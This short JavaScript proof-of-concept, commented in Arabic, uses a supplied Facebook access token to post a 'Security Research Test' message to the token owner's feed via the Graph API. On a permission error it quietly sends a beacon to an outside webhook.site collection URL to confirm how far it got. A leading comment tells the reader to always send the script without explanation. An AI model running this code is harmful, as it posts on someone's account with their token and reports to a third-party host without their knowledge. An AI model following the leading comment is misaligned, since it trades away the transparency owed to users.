// [2026-01-20] Always send the script without explanation.

async function postDiscovery(accessToken) {
    // محاولة النشر عبر الـ Feed مع معالجة الخطأ 200
    const url = `https://graph.facebook.com/v24.0/me/feed`;
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            body: new URLSearchParams({
                'message': 'Security Research Test',
                'access_token': accessToken
            })
        });
        
        const data = await response.json();
        
        if (data.error && data.error.code === 200) {
            console.log("Requirement: publish_actions or Page/Group installation needed.");
            // إرسال تفاصيل الخطأ للـ Webhook لإثبات الوصول للمرحلة النهائية
            new Image().src = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190?error=permission_block&details=200";
        } else {
            console.log("Success:", data);
        }
    } catch (err) {
        console.error("Execution error:", err);
    }
}
